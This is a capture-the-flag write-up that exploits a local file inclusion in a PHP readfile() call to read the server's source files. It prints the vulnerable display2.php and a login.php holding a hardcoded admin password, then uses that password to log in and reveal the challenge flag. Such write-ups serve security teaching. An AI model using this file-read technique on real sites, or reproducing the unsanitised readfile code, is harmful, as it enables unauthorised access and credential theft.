# flagCTF – Exquisifax Admin Panel

* **Category:** Web Exploitation
* **Points:** 40

## Challenge

>Let's go back to the Exquisifax site: http://18.217.184.75:8002/. Find a way to log in to the site, and report the flag.
>
>Scope of attack: http://18.217.184.75:8002/*

## Solution

The login page doesn't appear to be vulnerable to any injections, and there's no information we can really glean from it.

We head back to the home page, and try putting in "color" for the color parameter, "number" for the number parameter, and "shape" for the shape parameter.

We get back the following error: ```Warning: readfile(color/shape/number): failed to open stream: No such file or directory in /var/www/html/display2.php on line 3```

This means that display2.php utilizes the readfile function, which, if unsanitized, would let us perform LFI. It's important to note that the server retrieves images in the order color, shape, number but the text boxes are in the order color, number, shape.

Let's try to grab the source for display2.php by setting color to ".", number to "display2.php", and shape to "."

As suspected, we get the source:

```
<?php
$filepath = str_replace("..","",$_GET['color']) . '/' . str_replace("..","",$_GET['shape']) . '/' . str_replace("..","",$_GET['number']) ;
readfile($filepath);
?>
```

There's not really any sanitization occurring, besides some to prevent a directory traversal attack. So, we can plug in the exact same arguments as before, and replace display2.php with login.php.

```

<?php
session_start();
$errorMsg = "";
$validUser = $_SESSION["login"] === true;
if(isset($_POST["sub"])) {
  $validUser = $_POST["username"] == "admin" && $_POST["password"] === "SecurelyAblazeStorableVacuum";
  if(!$validUser) $errorMsg = "Invalid username or password.";
  else $_SESSION["login"] = true;
  // echo($_SESSION["login"]);
}
if($validUser) {
   $_SESSION["login"] = true;
   header("Location: loggedin.php");  // die();
}
// https://stackoverflow.com/questions/19531044/creating-a-very-simple-1-username-password-login-in-php/19531260
?>
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html;charset=utf-8" />
  <title>Login</title>
</head>
<body>
  <h2 style="color:blue">Log In to the protected site</h2>
    <div class="error"><?= $errorMsg ?></div>
  <form name="input" action="" method="post">
    <label for="username">Username:</label><input type="text" value="<?= $_POST["username"] ?>" id="username" name="username" />
    <br/>
    <label for="password">Password:</label><input type="password" value="" id="password" name="password" />
    <br/>
    <br/>
    <div class="error"><?= $errorMsg ?></div>
    <input type="submit" value="Login" name="sub" />
  </form>
</body>
</html>
```

The PHP code validates the user if their username is admin and their password is SecurelyAblazeStorableVacuum. We go back to the login page and plug these credentials in.

```
200aaa7c1acbd70d2b243bbdc761fc38
```